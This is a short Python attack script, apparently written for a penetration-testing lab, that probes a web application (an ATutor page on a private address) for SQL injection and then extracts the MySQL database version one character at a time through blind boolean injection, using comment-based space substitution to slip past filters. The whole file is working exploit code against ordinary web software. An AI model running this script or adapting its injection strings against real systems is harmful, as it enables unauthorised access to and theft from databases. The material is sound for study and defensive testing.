#!/usr/bin/python3

"""
Author: Aleksa Zatezalo
Name: SQLi Test.
Description: A python script made to test for potential sqli attacks.
Version: 1.0
"""

import sys
import re
import requests
from bs4 import BeautifulSoup

### Helper functions for query constuction ###
def replaceSpace(inj_str, type='mysql'):
    """
    Takes a potential SQLi injection string,inj_str, and replaces 
    all spaces with mysql equivilent spaces
    """
    
    if (type == 'mysql'):
        temp = inj_str.replace(" ", "/**/")
        inj_str = temp
    return inj_str


### Functions to test SQLi ###
def testSQLi(link, inj_str):
    """
    Tests a URL at address link, and attempss SQLi URL parameter inj_str.
    Retturns bool if SQLi is possible.

    String: link - a url with a parameters.
    String: inj_str - an injection string representing SQLi.
    """

    target = link + inj_str
    
    r = requests.get(target)
    s = BeautifulSoup(r.text, 'lxml')
    print("Response Headers:")
    print(r.headers)
    print()
    print("Response Content:")
    print(s.text)
    print()
    error = re.search("Invalid argument", s.text)

    # Successfull SQLi should return errors
    if error:
        return True
    return False

def execText(ip, inj_str, noSpace=True):

    if noSpace:
        inj_str = replaceSpace(inj_str)

    test = testSQLi(ip, inj_str)

    if test:
        print("Possible SQLi Found.")
    else:
        print("No SQL Erros Found.")

def extractVersionChar(ip, inj_str, type='mysql'):
    """
    Takes a SQLi vulnerable address, ip, and an injection string, inj_str.
    If a char, j, is found to be part of the SQLi Version it is returned.
    """

    for j in range(32, 126):
        target = ip + inj_str.replace("[CHAR]", str(j))
        r = requests.get(target)
        content_length = int(r.headers['Content-Length'])
        if (content_length > 20):
            return j
    return None

def extractVersion(ip, type='mysql', noSpaces=True):
    """
    Takes a SQLi vulnerable address, ip, and the type of DB running on server backend.
    The function returns the SQL DB version.
    """

    print ("(+) Retrieving database version....")
    for i in range(1, 20):
        if (type == 'mysql'):
            injection_string = "test') or (ascii(substring((select version()),%d,1)))=[CHAR]%%23" % i
        if noSpaces:
            injection_string = replaceSpace(injection_string, type=type)
     
        extracted_char = chr(extractVersionChar(ip, injection_string))   
        sys.stdout.write(extracted_char)
        sys.stdout.flush()
    print("\n(+) Done!")

if __name__ == "__main__":
    extractVersion("http://192.168.162.103/ATutor/mods/_standard/social/index_public.php?q=")